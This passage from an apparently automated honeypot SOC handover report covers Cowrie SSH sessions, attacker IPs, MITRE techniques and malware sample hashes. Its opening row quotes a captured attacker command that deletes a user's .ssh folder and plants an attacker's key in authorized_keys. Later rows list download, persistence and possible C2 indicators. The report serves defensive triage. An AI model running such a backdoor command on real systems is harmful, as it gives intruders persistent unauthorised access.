| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:51:11` | `cowrie.session.connect` |
| `2026-09-25 20:51:11` | `cowrie.client.version` |
| `2026-09-25 20:51:11` | `cowrie.client.kex` |
| `2026-09-25 20:51:12` | `cowrie.login.success` |
| `2026-09-25 20:51:12` | `cowrie.session.params` |
| `2026-09-25 20:51:12` | `cowrie.command.input` |
| `2026-09-25 20:51:12` | `cowrie.command.failed` |
| `2026-09-25 20:51:13` | `cowrie.log.closed` |
| `2026-09-25 20:51:13` | `cowrie.session.params` |
| `2026-09-25 20:51:13` | `cowrie.command.input` |
| `2026-09-25 20:51:13` | `cowrie.session.file_download` |
| `2026-09-25 20:51:13` | `cowrie.log.closed` |
| `2026-09-25 20:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.234[.]6` to AbuseIPDB if not already reported
- [ ] Block `217.154.234[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd7efe23d8f

| Field | Detail |
|---|---|
| **Source IP** | `217.154.234[.]6` |
| **First Seen** | 2026-09-25 20:51 |
| **Last Seen** | 2026-09-25 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:51:14` | `cowrie.session.connect` |
| `2026-09-25 20:51:14` | `cowrie.client.version` |
| `2026-09-25 20:51:14` | `cowrie.client.kex` |
| `2026-09-25 20:51:14` | `cowrie.login.success` |
| `2026-09-25 20:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.234[.]6` to AbuseIPDB if not already reported
- [ ] Block `217.154.234[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723f22f2ecbe

| Field | Detail |
|---|---|
| **Source IP** | `217.154.234[.]6` |
| **First Seen** | 2026-09-25 20:51 |
| **Last Seen** | 2026-09-25 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:51:14` | `cowrie.session.connect` |
| `2026-09-25 20:51:14` | `cowrie.client.version` |
| `2026-09-25 20:51:14` | `cowrie.client.kex` |
| `2026-09-25 20:51:15` | `cowrie.login.success` |
| `2026-09-25 20:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.234[.]6` to AbuseIPDB if not already reported
- [ ] Block `217.154.234[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.5[.]188` | **6** | 2026-09-25 16:41 | 2026-09-25 19:56 | 6m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-09-25 20:00 | 2026-09-25 20:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.105[.]104` | **5** | 2026-09-25 18:37 | 2026-09-25 18:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.211.194[.]214` | **4** | 2026-09-25 16:12 | 2026-09-25 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `162.243.27[.]60` | **4** | 2026-09-25 17:00 | 2026-09-25 17:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | **4** | 2026-09-25 15:50 | 2026-09-25 15:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | **4** | 2026-09-25 15:37 | 2026-09-25 18:48 | 4m | 0 | `T1592` | 🟢 LOW |
| `193.33.39[.]67` | **3** | 2026-09-25 20:03 | 2026-09-25 20:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **3** | 2026-09-25 18:16 | 2026-09-25 19:17 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-09-25 16:13 | 2026-09-25 17:56 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]51` | **2** | 2026-09-25 19:07 | 2026-09-25 19:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.174.104[.]140` | **2** | 2026-09-25 15:35 | 2026-09-25 15:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]253` | **2** | 2026-09-25 20:30 | 2026-09-25 20:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]56` | **2** | 2026-09-25 20:44 | 2026-09-25 20:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.98.163[.]88` | **2** | 2026-09-25 16:58 | 2026-09-25 16:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | **2** | 2026-09-25 19:45 | 2026-09-25 20:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.94.53[.]14` | **2** | 2026-09-25 20:33 | 2026-09-25 20:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-09-25 15:04 | 2026-09-25 15:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-09-25 15:10 | 2026-09-25 15:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `106.13.124[.]251` | 1 | 2026-09-25 19:23 | 2026-09-25 19:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.254.75[.]21` | 1 | 2026-09-25 19:51 | 2026-09-25 19:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.190.179[.]68` | 1 | 2026-09-25 19:23 | 2026-09-25 19:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.85[.]168` | 1 | 2026-09-25 20:32 | 2026-09-25 20:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.177[.]230` | 1 | 2026-09-25 19:39 | 2026-09-25 19:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.34[.]40` | 1 | 2026-09-25 20:47 | 2026-09-25 20:47 | 21s | 0 | `T1592` | 🟢 LOW |
| `118.145.228[.]55` | 1 | 2026-09-25 15:40 | 2026-09-25 15:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.189.242[.]5` | 1 | 2026-09-25 19:16 | 2026-09-25 19:16 | 21s | 0 | `T1592` | 🟢 LOW |
| `118.35.190[.]116` | 1 | 2026-09-25 15:00 | 2026-09-25 15:01 | 30s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]183` | 1 | 2026-09-25 14:59 | 2026-09-25 14:59 | 25s | 0 | `T1592` | 🟢 LOW |
| `122.13.25[.]186` | 1 | 2026-09-25 15:25 | 2026-09-25 15:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-25 19:04 | 2026-09-25 19:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-09-25 20:27 | 2026-09-25 20:27 | 44s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]153` | 1 | 2026-09-25 20:36 | 2026-09-25 20:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-09-25 18:45 | 2026-09-25 18:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]141` | 1 | 2026-09-25 17:31 | 2026-09-25 17:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]26` | 1 | 2026-09-25 17:38 | 2026-09-25 17:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.245.151[.]77` | 1 | 2026-09-25 18:03 | 2026-09-25 18:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.0.166[.]12` | 1 | 2026-09-25 20:14 | 2026-09-25 20:14 | 16s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-09-25 20:34 | 2026-09-25 20:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-09-25 18:44 | 2026-09-25 18:44 | 1s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]227` | 1 | 2026-09-25 18:05 | 2026-09-25 18:05 | 6s | 0 | `T1592` | 🟢 LOW |
| `180.76.60[.]83` | 1 | 2026-09-25 20:43 | 2026-09-25 20:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]149` | 1 | 2026-09-25 15:30 | 2026-09-25 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]157` | 1 | 2026-09-25 15:30 | 2026-09-25 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-09-25 17:40 | 2026-09-25 17:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.220.251[.]161` | 1 | 2026-09-25 17:42 | 2026-09-25 17:42 | 16s | 0 | `T1592` | 🟢 LOW |
| `24.72.29[.]49` | 1 | 2026-09-25 19:45 | 2026-09-25 19:46 | 21s | 0 | `T1592` | 🟢 LOW |
| `36.134.96[.]76` | 1 | 2026-09-25 20:32 | 2026-09-25 20:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `5.178.244[.]69` | 1 | 2026-09-25 16:51 | 2026-09-25 16:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-09-25 19:07 | 2026-09-25 19:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.55.79[.]24` | 1 | 2026-09-25 19:44 | 2026-09-25 19:44 | 14s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-25 17:04 | 2026-09-25 17:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-25 20:29 | 2026-09-25 20:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-25 15:04 | 2026-09-25 15:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.148.49[.]11` | 1 | 2026-09-25 18:35 | 2026-09-25 18:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-09-25 15:08 | 2026-09-25 15:09 | 16s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-25 16:49 | 2026-09-25 16:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-25 18:41 | 2026-09-25 18:42 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.163.118[.]115` | VN | BKHOST TECHNOLOGY VIETNAM JOINT STOCK COMPANY | **100** ⚠️ | 28 |
| `121.227.152[.]171` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 49 |
| `172.174.104[.]140` | US | Microsoft Limited | **100** ⚠️ | 2 |
| `107.150.105[.]104` | US | UCLOUD | **100** ⚠️ | 3 |
| `121.191.167[.]183` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `187.95.46[.]100` | BR | Global Telecom do Brasil | **100** ⚠️ | 3 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `118.189.242[.]5` | SG | M1-LIMITED-MOBILE-BROADBAND | **100** ⚠️ | 8 |
| `175.202.194[.]227` | KR | Korea Telecom | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 189 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 70 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 69 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 68 |

---

## 🔕 False Positive Summary (47 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 4 below threshold 25 | 7 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 327 cases |
| Tool 34  | Credential Extractor        | ✅ 258 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 20 fingerprints |
| Tool 36  | Command Clustering          | ✅ 10 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 105 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 47 filtered (14.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 184 priority case(s) shown individually · 58 recon entry/entries in table (17 group(s) consolidating 55 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-25T21:17:59Z_
